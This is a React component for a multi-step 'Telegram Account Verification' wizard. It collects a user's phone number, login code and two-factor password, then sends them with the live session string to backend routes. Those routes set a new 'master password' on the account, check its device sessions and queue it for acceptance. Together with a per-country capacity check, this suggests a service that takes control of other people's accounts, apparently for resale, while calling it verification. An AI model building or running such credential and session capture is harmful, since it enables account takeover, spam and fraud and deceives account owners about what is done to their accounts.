'use client'

import { useState, useEffect } from 'react'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card'
import { Alert, AlertDescription } from '@/components/ui/alert'
import { Spinner } from '@/components/ui/spinner'
import { CheckCircle, XCircle, Clock, AlertCircle } from 'lucide-react'

interface FlowState {
  step: number
  accountId?: string
  phoneNumber: string
  countryCode?: string
  phoneCodeHash?: string
  sessionString?: string
  userId?: string
  requires2FA: boolean
  error?: string
  loading: boolean
}

export function TelegramFlowWizard() {
  const [state, setState] = useState<FlowState>({
    step: 1,
    phoneNumber: '',
    requires2FA: false,
    loading: false,
  })

  const [otpCode, setOtpCode] = useState('')
  const [password2FA, setPassword2FA] = useState('')
  const [pendingInfo, setPendingInfo] = useState<any>(null)

  // Step 1: Check Capacity
  const handleCheckCapacity = async (e: React.FormEvent) => {
    e.preventDefault()
    setState({ ...state, loading: true, error: undefined })

    try {
      const response = await fetch('/api/telegram-flow/check-capacity', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber: state.phoneNumber }),
      })

      const data = await response.json()

      if (!data.success || !data.hasCapacity) {
        setState({ 
          ...state, 
          loading: false, 
          error: data.message || 'No capacity available' 
        })
        return
      }

      // Capacity available, send OTP
      await handleSendOTP(data.countryCode)
    } catch (error: any) {
      setState({ ...state, loading: false, error: error.message })
    }
  }

  // Step 2: Send OTP
  const handleSendOTP = async (countryCode: string) => {
    try {
      const response = await fetch('/api/telegram-flow/send-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          phoneNumber: state.phoneNumber, 
          countryCode,
        }),
      })

      const data = await response.json()

      if (!data.success) {
        setState({ ...state, loading: false, error: data.error })
        return
      }

      setState({
        ...state,
        step: 2,
        accountId: data.accountId,
        phoneCodeHash: data.phoneCodeHash,
        sessionString: data.sessionString,
        countryCode,
        loading: false,
      })
    } catch (error: any) {
      setState({ ...state, loading: false, error: error.message })
    }
  }

  // Step 3: Verify OTP
  const handleVerifyOTP = async (e: React.FormEvent) => {
    e.preventDefault()
    setState({ ...state, loading: true, error: undefined })

    try {
      const response = await fetch('/api/telegram-flow/verify-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          accountId: state.accountId,
          phoneNumber: state.phoneNumber,
          phoneCodeHash: state.phoneCodeHash,
          otpCode,
          sessionString: state.sessionString,
        }),
      })

      const data = await response.json()

      if (!data.success) {
        setState({ ...state, loading: false, error: data.error })
        return
      }

      if (data.requires2FA) {
        // Need 2FA password
        setState({
          ...state,
          step: 3,
          requires2FA: true,
          sessionString: data.sessionString,
          loading: false,
        })
      } else {
        // No 2FA, proceed to password setup
        setState({
          ...state,
          userId: data.userId,
          sessionString: data.sessionString,
          loading: false,
        })
        await handleSetupPassword(data.sessionString)
      }
    } catch (error: any) {
      setState({ ...state, loading: false, error: error.message })
    }
  }

  // Step 4: Verify 2FA (Optional)
  const handleVerify2FA = async (e: React.FormEvent) => {
    e.preventDefault()
    setState({ ...state, loading: true, error: undefined })

    try {
      const response = await fetch('/api/telegram-flow/verify-2fa', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          accountId: state.accountId,
          phoneNumber: state.phoneNumber,
          password: password2FA,
          sessionString: state.sessionString,
        }),
      })

      const data = await response.json()

      if (!data.success) {
        setState({ ...state, loading: false, error: data.error })
        return
      }

      // 2FA verified, proceed to password setup
      setState({ ...state, userId: data.userId, loading: false })
      await handleSetupPassword(state.sessionString!)
    } catch (error: any) {
      setState({ ...state, loading: false, error: error.message })
    }
  }

  // Step 5-6: Setup Password & Check Sessions (automated)
  const handleSetupPassword = async (sessionString: string) => {
    setState({ ...state, step: 4, loading: true, error: undefined })

    try {
      // Setup password
      const passwordResponse = await fetch('/api/telegram-flow/setup-password', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          accountId: state.accountId,
          sessionString,
          currentPassword: state.requires2FA ? password2FA : undefined,
        }),
      })

      const passwordData = await passwordResponse.json()

      if (!passwordData.success) {
        if (passwordData.rejected) {
          setState({ ...state, step: 6, loading: false, error: passwordData.reason })
          return
        }
        setState({ ...state, loading: false, error: passwordData.error })
        return
      }

      // Check sessions
      const sessionsResponse = await fetch('/api/telegram-flow/check-sessions', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          accountId: state.accountId,
          sessionString,
        }),
      })

      const sessionsData = await sessionsResponse.json()

      // Move to pending
      setState({ ...state, step: 5, loading: false })
      startPendingStatusPolling()
    } catch (error: any) {
      setState({ ...state, loading: false, error: error.message })
    }
  }

  // Step 7: Poll pending status
  const startPendingStatusPolling = () => {
    const pollInterval = setInterval(async () => {
      try {
        const response = await fetch(
          `/api/telegram-flow/add-to-pending?accountId=${state.accountId}`
        )
        const data = await response.json()
        
        setPendingInfo(data)

        if (data.isReady) {
          clearInterval(pollInterval)
        }

        // Check if final validation completed
        if (data.status === 'accepted' || data.status === 'rejected') {
          clearInterval(pollInterval)
          setState({ ...state, step: 6 })
        }
      } catch (error) {
        console.error('Error polling status:', error)
      }
    }, 10000) // Poll every 10 seconds

    // Cleanup on unmount
    return () => clearInterval(pollInterval)
  }

  const renderStep = () => {
    switch (state.step) {
      case 1:
        return (
          <Card>
            <CardHeader>
              <CardTitle>Enter Telegram Number</CardTitle>
              <CardDescription>
                Enter your Telegram phone number to begin verification
              </CardDescription>
            </CardHeader>
            <CardContent>
              <form onSubmit={handleCheckCapacity} className="space-y-4">
                <Input
                  type="tel"
                  placeholder="+1234567890"
                  value={state.phoneNumber}
                  onChange={(e) => setState({ ...state, phoneNumber: e.target.value })}
                  required
                />
                <Button type="submit" disabled={state.loading}>
                  {state.loading ? <Spinner className="mr-2" /> : null}
                  Continue
                </Button>
              </form>
            </CardContent>
          </Card>
        )

      case 2:
        return (
          <Card>
            <CardHeader>
              <CardTitle>Enter OTP Code</CardTitle>
              <CardDescription>
                We sent a verification code to {state.phoneNumber}
              </CardDescription>
            </CardHeader>
            <CardContent>
              <form onSubmit={handleVerifyOTP} className="space-y-4">
                <Input
                  type="text"
                  placeholder="12345"
                  value={otpCode}
                  onChange={(e) => setOtpCode(e.target.value)}
                  required
                />
                <Button type="submit" disabled={state.loading}>
                  {state.loading ? <Spinner className="mr-2" /> : null}
                  Verify OTP
                </Button>
              </form>
            </CardContent>
          </Card>
        )

      case 3:
        return (
          <Card>
            <CardHeader>
              <CardTitle>Enter Account Password</CardTitle>
              <CardDescription>
                This account has 2FA enabled. Please enter your Telegram password.
              </CardDescription>
            </CardHeader>
            <CardContent>
              <form onSubmit={handleVerify2FA} className="space-y-4">
                <Input
                  type="password"
                  placeholder="Password"
                  value={password2FA}
                  onChange={(e) => setPassword2FA(e.target.value)}
                  required
                />
                <Button type="submit" disabled={state.loading}>
                  {state.loading ? <Spinner className="mr-2" /> : null}
                  Verify Password
                </Button>
              </form>
            </CardContent>
          </Card>
        )

      case 4:
        return (
          <Card>
            <CardHeader>
              <CardTitle>Processing Account</CardTitle>
              <CardDescription>
                Setting up master password and checking device sessions...
              </CardDescription>
            </CardHeader>
            <CardContent className="flex items-center justify-center py-8">
              <Spinner className="w-8 h-8" />
            </CardContent>
          </Card>
        )

      case 5:
        return (
          <Card>
            <CardHeader>
              <CardTitle>
                <Clock className="inline-block mr-2" />
                Account in Pending Queue
              </CardTitle>
              <CardDescription>
                Your account is being validated. Please wait...
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              {pendingInfo && (
                <>
                  <div className="space-y-2">
                    <p className="text-sm">
                      <strong>Wait Time:</strong> {pendingInfo.waitMinutes} minutes
                    </p>
                    <p className="text-sm">
                      <strong>Time Passed:</strong> {pendingInfo.minutesPassed} minutes
                    </p>
                    <p className="text-sm">
                      <strong>Time Remaining:</strong> {pendingInfo.minutesRemaining} minutes
                    </p>
                  </div>
                  {pendingInfo.isReady && (
                    <Alert>
                      <AlertCircle className="h-4 w-4" />
                      <AlertDescription>
                        Ready for final validation! Processing will happen automatically.
                      </AlertDescription>
                    </Alert>
                  )}
                </>
              )}
            </CardContent>
          </Card>
        )

      case 6:
        return (
          <Card>
            <CardHeader>
              <CardTitle>
                {state.error ? (
                  <>
                    <XCircle className="inline-block mr-2 text-red-500" />
                    Account Rejected
                  </>
                ) : (
                  <>
                    <CheckCircle className="inline-block mr-2 text-green-500" />
                    Account Accepted
                  </>
                )}
              </CardTitle>
            </CardHeader>
            <CardContent>
              {state.error ? (
                <Alert variant="destructive">
                  <AlertDescription>{state.error}</AlertDescription>
                </Alert>
              ) : (
                <Alert>
                  <AlertDescription>
                    Your account has been successfully validated and accepted!
                  </AlertDescription>
                </Alert>
              )}
            </CardContent>
          </Card>
        )

      default:
        return null
    }
  }

  return (
    <div className="max-w-2xl mx-auto p-4 space-y-4">
      <div className="flex justify-between items-center mb-8">
        <h1 className="text-2xl font-bold">Telegram Account Verification</h1>
        <span className="text-sm text-gray-500">Step {state.step} of 6</span>
      </div>

      {state.error && state.step < 6 && (
        <Alert variant="destructive">
          <AlertDescription>{state.error}</AlertDescription>
        </Alert>
      )}

      {renderStep()}
    </div>
  )
}
